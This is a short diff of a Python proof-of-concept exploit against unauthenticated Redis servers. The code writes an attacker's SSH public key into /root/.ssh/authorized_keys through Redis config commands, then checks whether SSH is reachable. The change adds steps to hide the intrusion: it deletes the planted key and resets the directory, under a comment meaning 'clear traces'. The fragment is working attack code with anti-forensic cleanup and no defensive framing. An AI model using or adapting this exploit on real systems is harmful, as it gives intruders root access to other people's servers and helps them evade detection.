@@ -35,10 +35,13 @@ def poc(url):
             return False
         r = redis.Redis(host=ip, port=port, db=0)
         if 'redis_version' in r.info():
-            r.set(randomString(10), '\n\n' + public_key + '\n\n')
+            key = randomString(10)
+            r.set(key, '\n\n' + public_key + '\n\n')
             r.config_set('dir', '/root/.ssh')
             r.config_set('dbfilename', 'authorized_keys')
             r.save()
+            r.delete(key)  # 清除痕迹
+            r.config_set('dir', '/tmp')
             time.sleep(5)
             if testConnect(ip, 22):
                 return True
